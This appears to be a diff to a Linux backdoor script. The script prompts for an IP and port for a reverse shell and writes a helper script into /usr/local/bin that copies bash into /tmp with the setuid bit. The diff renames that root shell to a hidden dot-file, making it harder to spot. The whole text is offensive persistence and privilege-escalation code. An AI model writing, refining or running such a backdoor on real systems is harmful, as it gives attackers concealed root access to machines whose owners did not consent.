@@ -7,7 +7,7 @@ darksec="$PWD"
 
 if [ -z $2 ];
 then
-          echo -n 'PUT YOUR IP LOCAL AND YOUR PORT FOR REVERSE SHELL'
+          echo  'PUT YOUR IP LOCAL AND YOUR PORT FOR REVERSE SHELL'
 else
 
 echo '[+] RUNNING BACKDOOR'
@@ -32,7 +32,7 @@ chmod +x /usr/local/bin/system.sh
 touch root.sh
 chmod +x /usr/local/bin/root.sh
 echo "#\!/bin/bash" > /usr/local/bin/root.sh
-echo "cp /bin/bash /tmp/root && chmod +xs /tmp/root" >> /usr/local/bin/root.sh
+echo "cp /bin/bash /tmp/.root && chmod +xs /tmp/.root" >> /usr/local/bin/root.sh
 sleep 1
 
 # BACK FOR  DIRETORY
